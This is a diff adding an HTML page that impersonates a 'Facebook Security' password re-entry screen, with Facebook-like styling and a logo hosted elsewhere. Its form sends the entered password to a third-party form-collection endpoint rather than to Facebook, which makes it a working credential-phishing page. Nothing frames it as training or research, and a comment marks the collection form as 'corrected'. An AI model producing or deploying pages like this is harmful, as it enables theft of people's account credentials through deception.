@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .security-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .fb-logo {
+            margin-bottom: 20px;
+        }
+
+        .fb-logo img {
+            height: 150px;
+            width: auto;
+        }
+
+        .security-header {
+            margin-bottom: 20px;
+        }
+
+        .security-header h1 {
+            color: #1c1e21;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .security-header p {
+            color: #606770;
+            font-size: 15px;
+        }
+
+        .security-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            text-align: left;
+        }
+
+        .form-group label {
+            color: #606770;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 10px 0;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .footer-links {
+            margin-top: 15px;
+        }
+
+        .footer-links a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 5px 0;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                background-color: #ffffff;
+            }
+
+            .security-container {
+                box-shadow: none;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="security-container">
+        <div class="fb-logo">
+            <img src="https://ucarecdn.com/b3b95dd8-7ac6-4017-8597-929f47addd9d/WhatsAppImage20250704at043706_1a9b7ef8.jpg" alt="Facebook Logo">
+        </div>
+
+        <div class="security-header">
+            <h1>Facebook Security</h1>
+            <p>Please re-enter your password to complete the request.</p>
+        </div>
+
+        <!-- Corrected form starts here -->
+        <form class="security-form" action="https://submit-form.com/XZAETXl2K" method="POST">
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <div class="divider"></div>
+
+            <button type="submit" class="login-btn">Next</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">Forgotten password?</a>
+        </div>
+    </div>
+</body>
+</html>
